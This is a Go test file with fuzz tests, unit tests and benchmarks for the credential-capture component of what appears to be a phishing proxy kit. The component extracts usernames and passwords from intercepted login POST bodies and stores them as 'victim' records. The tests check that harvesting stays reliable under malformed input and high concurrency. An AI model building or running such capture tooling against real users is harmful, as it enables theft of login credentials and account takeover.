package capture

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

// ─── Fuzz Tests ───────────────────────────────────────────────────────────────

// FuzzExtractFromForm fuzzes URL-encoded credential extraction.
// Goal: no panics, no crashes on arbitrary form bodies.
func FuzzExtractFromForm(f *testing.F) {
	ci, _ := newTestInterceptor()

	f.Add("login=user&passwd=secret")
	f.Add("email=a%40b.com&password=123")
	f.Add("")
	f.Add("&&&&")
	f.Add("=")
	f.Add(strings.Repeat("a", 10000))
	f.Add("login=%FF%FE&passwd=%00")
	f.Add("login=\x00\x01\x02&passwd=\xff")
	f.Add("login=a=b=c&passwd=x=y")

	f.Fuzz(func(t *testing.T, body string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("extractFromForm panicked on %q: %v", body, r)
			}
		}()
		user, pass := ci.extractFromForm(body)
		_ = user
		_ = pass
	})
}

// FuzzExtractFromJSON fuzzes JSON credential extraction.
func FuzzExtractFromJSON(f *testing.F) {
	ci, _ := newTestInterceptor()

	f.Add(`{"login":"user","passwd":"pass"}`)
	f.Add(`{}`)
	f.Add(`{"login": null}`)
	f.Add(`not json at all`)
	f.Add(`{"login": "` + strings.Repeat("x", 10000) + `"}`)
	f.Add(`{"login": "user\u0000name"}`)
	f.Add(`{"login": "user", "passwd": "`)
	f.Add(`{{{{{`)
	f.Add("")

	f.Fuzz(func(t *testing.T, body string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("extractFromJSON panicked on %q: %v", body, r)
			}
		}()
		user, pass := ci.extractFromJSON(body)
		_ = user
		_ = pass
	})
}

// FuzzInspectRequest fuzzes the full request inspector with arbitrary bodies and content types.
func FuzzInspectRequest(f *testing.F) {
	ci, _ := newTestInterceptor()

	f.Add("application/x-www-form-urlencoded", "login=user&passwd=pass", "victim-fuzz-1")
	f.Add("application/json", `{"login":"u","passwd":"p"}`, "victim-fuzz-2")
	f.Add("text/plain", "garbage", "victim-fuzz-3")
	f.Add("", "", "victim-fuzz-4")
	f.Add("application/x-www-form-urlencoded", strings.Repeat("x=y&", 1000), "victim-fuzz-5")

	f.Fuzz(func(t *testing.T, contentType string, body string, victimID string) {
		if victimID == "" {
			victimID = "fuzz-victim"
		}
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("InspectRequest panicked: %v", r)
			}
		}()
		req, err := http.NewRequest("POST", "https://example.com/login", io.NopCloser(bytes.NewReader([]byte(body))))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", contentType)
		ci.InspectRequest(req, []byte(body), victimID)
	})
}

// ─── Extended Unit Tests ──────────────────────────────────────────────────────

// TestEmptyBodyIgnored ensures empty POST bodies don't create spurious records.
func TestEmptyBodyIgnored(t *testing.T) {
	ci, s := newTestInterceptor()
	req, _ := http.NewRequest("POST", "https://example.com/login", nil)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	ci.InspectRequest(req, []byte{}, "victim-empty")
	time.Sleep(10 * time.Millisecond)
	_, ok := s.GetVictim("victim-empty")
	if ok {
		t.Error("empty body should not create a victim record")
	}
}

// TestOnlyUsernameNoPassword — some sites submit username first, password second.
func TestOnlyUsername(t *testing.T) {
	ci, s := newTestInterceptor()
	body := "login=user@test.com"
	req, _ := http.NewRequest("POST", "https://example.com/step1", io.NopCloser(bytes.NewReader([]byte(body))))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	ci.InspectRequest(req, []byte(body), "victim-u")
	time.Sleep(10 * time.Millisecond)
	v, ok := s.GetVictim("victim-u")
	if !ok {
		t.Fatal("victim with username-only should be recorded")
	}
	if v.Credentials[0].Username != "user@test.com" {
		t.Errorf("wrong username: %q", v.Credentials[0].Username)
	}
}

// TestURLEncodedSpecialChars ensures percent-encoded characters are decoded.
func TestURLEncodedSpecialChars(t *testing.T) {
	ci, s := newTestInterceptor()
	body := "login=user%2B123%40example.com&passwd=p%40ss%21"
	req, _ := http.NewRequest("POST", "https://example.com/login", io.NopCloser(bytes.NewReader([]byte(body))))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	ci.InspectRequest(req, []byte(body), "victim-special")
	time.Sleep(10 * time.Millisecond)
	v, ok := s.GetVictim("victim-special")
	if !ok {
		t.Fatal("victim not found")
	}
	if v.Credentials[0].Username != "user+123@example.com" {
		t.Errorf("URL decoding failed for username: %q", v.Credentials[0].Username)
	}
	if v.Credentials[0].Password != "p@ss!" {
		t.Errorf("URL decoding failed for password: %q", v.Credentials[0].Password)
	}
}

// TestJSONFallbackExtraction — no explicit regex, use generic JSON key matching.
func TestJSONFallbackExtraction(t *testing.T) {
	s := store.NewStore("")
	p := &phishlet.Phishlet{Name: "test"} // No explicit credential config
	ci := NewCredentialInterceptor(s, p)

	body := `{"username": "admin", "password": "secret"}`
	req, _ := http.NewRequest("POST", "https://example.com/api/auth", io.NopCloser(bytes.NewReader([]byte(body))))
	req.Header.Set("Content-Type", "application/json")
	ci.InspectRequest(req, []byte(body), "victim-json-fb")
	time.Sleep(10 * time.Millisecond)

	v, ok := s.GetVictim("victim-json-fb")
	if !ok {
		t.Fatal("victim not found for JSON fallback extraction")
	}
	if v.Credentials[0].Username != "admin" {
		t.Errorf("JSON fallback username: got %q want 'admin'", v.Credentials[0].Username)
	}
	if v.Credentials[0].Password != "secret" {
		t.Errorf("JSON fallback password: got %q want 'secret'", v.Credentials[0].Password)
	}
}

// TestMultipartFormData tests credential extraction from multipart bodies.
func TestMultipartFormData(t *testing.T) {
	ci, s := newTestInterceptor()
	body := "login=multipart_user&passwd=multipart_pass"
	req, _ := http.NewRequest("POST", "https://example.com/login", io.NopCloser(bytes.NewReader([]byte(body))))
	req.Header.Set("Content-Type", "multipart/form-data")
	ci.InspectRequest(req, []byte(body), "victim-mp")
	time.Sleep(10 * time.Millisecond)
	v, ok := s.GetVictim("victim-mp")
	if !ok {
		t.Fatal("multipart victim not found")
	}
	if v.Credentials[0].Username != "multipart_user" {
		t.Errorf("multipart username: %q", v.Credentials[0].Username)
	}
}

// TestPUTMethodIgnored — only POST should be captured.
func TestPUTMethodIgnored(t *testing.T) {
	ci, s := newTestInterceptor()
	body := "login=user&passwd=pass"
	req, _ := http.NewRequest("PUT", "https://example.com/update", io.NopCloser(bytes.NewReader([]byte(body))))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	ci.InspectRequest(req, []byte(body), "victim-put")
	time.Sleep(10 * time.Millisecond)
	_, ok := s.GetVictim("victim-put")
	if ok {
		t.Error("PUT method should not be captured")
	}
}

// TestMultipleCredentialCaptures — same victim submits credentials twice.
func TestMultipleCredentialCaptures(t *testing.T) {
	ci, s := newTestInterceptor()
	for i := 0; i < 3; i++ {
		body := fmt.Sprintf("login=user%d&passwd=pass%d", i, i)
		req, _ := http.NewRequest("POST", "https://example.com/login", io.NopCloser(bytes.NewReader([]byte(body))))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		ci.InspectRequest(req, []byte(body), "victim-multi")
		time.Sleep(5 * time.Millisecond)
	}
	v, ok := s.GetVictim("victim-multi")
	if !ok {
		t.Fatal("victim not found")
	}
	if len(v.Credentials) != 3 {
		t.Errorf("expected 3 credentials, got %d", len(v.Credentials))
	}
}

// TestHighConcurrencyCredentials stresses the capture pipeline with 100 goroutines.
func TestHighConcurrencyCredentials(t *testing.T) {
	ci, s := newTestInterceptor()
	const n = 100
	var wg sync.WaitGroup
	wg.Add(n)
	for i := 0; i < n; i++ {
		go func(i int) {
			defer wg.Done()
			body := fmt.Sprintf("login=user%d&passwd=pass%d", i, i)
			req, _ := http.NewRequest("POST", "https://example.com/login", io.NopCloser(bytes.NewReader([]byte(body))))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			ci.InspectRequest(req, []byte(body), fmt.Sprintf("victim-%d", i))
		}(i)
	}
	wg.Wait()
	time.Sleep(50 * time.Millisecond)

	victims := s.GetAllVictims()
	if len(victims) != n {
		t.Errorf("expected %d victims, got %d", n, len(victims))
	}
}

// ─── Benchmarks ───────────────────────────────────────────────────────────────

func BenchmarkExtractFromForm(b *testing.B) {
	ci, _ := newTestInterceptor()
	body := "login=user%40example.com&passwd=supersecretpassword123"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ci.extractFromForm(body)
	}
}

func BenchmarkExtractFromJSON(b *testing.B) {
	ci, _ := newTestInterceptor()
	body := `{"login": "admin@corp.com", "passwd": "hunter2", "remember": true}`
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ci.extractFromJSON(body)
	}
}

func BenchmarkInspectRequest_Form(b *testing.B) {
	ci, _ := newTestInterceptor()
	body := []byte("login=bench@test.com&passwd=benchpass")
	req, _ := http.NewRequest("POST", "https://example.com/login", nil)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req.Body = io.NopCloser(bytes.NewReader(body))
		ci.InspectRequest(req, body, fmt.Sprintf("bench-victim-%d", i))
	}
}

func BenchmarkMaskPassword(b *testing.B) {
	pass := "supersecretpassword123"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		maskPassword(pass)
	}
}
